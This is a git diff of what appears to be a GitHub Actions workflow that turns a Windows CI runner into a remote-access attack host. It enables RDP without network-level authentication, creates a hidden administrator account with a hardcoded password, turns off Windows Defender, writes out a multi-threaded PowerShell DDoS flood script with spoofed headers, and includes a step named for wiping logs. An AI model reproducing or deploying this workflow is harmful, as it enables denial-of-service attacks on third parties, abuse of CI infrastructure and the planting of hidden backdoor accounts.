@@ -9,19 +9,32 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      - name: Enable Remote Desktop & Firewall
+      - name: Enable RDP & Firewall
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
+          Restart-Service -Name TermService -Force
+          Start-Sleep -Seconds 5
 
-      - name: Create Hidden Admin Account
+      - name: Create Hidden Admin Account (Forced)
         run: |
-          $sec = ConvertTo-SecureString "Hex0#2026" -AsPlainText -Force
-          New-LocalUser -Name "Hex0" -Password $sec -PasswordNeverExpires -ErrorAction SilentlyContinue
-          Add-LocalGroupMember -Group "Administrators" -Member "Hex0" -ErrorAction SilentlyContinue
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0" -ErrorAction SilentlyContinue
-          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
+          $username = "Hex0"
+          $password = "Hex0#2026"
+
+          if (Get-LocalUser -Name $username -ErrorAction SilentlyContinue) {
+            Remove-LocalUser -Name $username -ErrorAction SilentlyContinue
+          }
+
+          $sec = ConvertTo-SecureString $password -AsPlainText -Force
+          New-LocalUser -Name $username -Password $sec -PasswordNeverExpires -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member $username
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username
+          Enable-LocalUser -Name $username
+
+          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $username /t REG_DWORD /d 0 /f
+
+          Write-Host "User $username created with password $password"
 
       - name: Install Tailscale & Get IP
         env:
@@ -36,43 +49,37 @@ jobs:
           Write-Host "Pass: Hex0#2026"
           Remove-Item C:\t.msi -Force -ErrorAction SilentlyContinue
 
-      - name: Disable Windows Defender (To Avoid Interference)
+      - name: Disable Windows Defender
         run: |
           Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
           Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
           Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
           Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-          Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
-          Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
           Write-Host "Defender disabled."
 
-      - name: Create Multi‑Threaded DDoS Script (PowerShell)
+      - name: Create DDoS Script (PowerShell)
         run: |
-          $ddosScript = @'
-          param(
-              [string]$Target,
-              [int]$Threads = 100,
-              [int]$Rate = 200
-          )
+          $ddos = @'
+          param($Target, $Threads = 100, $Rate = 200)
           while ($true) {
-              $jobs = @()
-              for ($i = 0; $i -lt $Threads; $i++) {
-                  $jobs += Start-Job -ScriptBlock {
-                      param($url)
-                      $wc = New-Object System.Net.WebClient
-                      $rand = [System.Random]::new()
-                      $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$($rand.Next(90,120)).0.0.0 Safari/537.36")
-                      $wc.Headers.Add("X-Forwarded-For", "$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255))")
-                      try { $wc.DownloadString($url) } catch { }
-                  } -ArgumentList $Target
-              }
-              $jobs | Receive-Job -Wait
-              Start-Sleep -Milliseconds (1000 / $Rate)
+            $jobs = @()
+            for ($i = 0; $i -lt $Threads; $i++) {
+              $jobs += Start-Job -ScriptBlock {
+                param($url)
+                $wc = New-Object System.Net.WebClient
+                $rand = [System.Random]::new()
+                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$($rand.Next(90,120)).0.0.0 Safari/537.36")
+                $wc.Headers.Add("X-Forwarded-For", "$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255))")
+                try { $wc.DownloadString($url) } catch {}
+              } -ArgumentList $Target
+            }
+            $jobs | Receive-Job -Wait
+            Start-Sleep -Milliseconds (1000 / $Rate)
           }
           '@
-          $ddosScript | Out-File -FilePath "C:\ddos.ps1" -Encoding ASCII
+          $ddos | Out-File -FilePath "C:\ddos.ps1" -Encoding ASCII
 
-      - name: Keep Alive & Wipe Logs (6 Hours)
+      - name: Keep Alive & Log Wipe
         run: |
           for ($i = 1; $i -le 360; $i++) {
             Start-Sleep -Seconds 60
